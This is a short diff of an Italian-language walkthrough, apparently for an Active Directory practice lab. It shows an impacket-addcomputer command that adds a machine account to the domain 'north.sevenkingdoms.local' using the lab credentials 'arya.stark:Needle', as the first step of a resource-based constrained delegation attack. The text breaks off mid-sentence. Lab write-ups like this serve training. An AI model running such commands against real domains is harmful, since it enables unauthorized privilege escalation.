@@ -39,3 +39,4 @@ Quindi per prima cosa aggiungeremo un nuovo computer al domain
 ```bash
 impacket-addcomputer -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 192.168.56.11 'north.sevenkingdoms.local/arya.stark:Needle'
 ```
+e settiamo quindi 
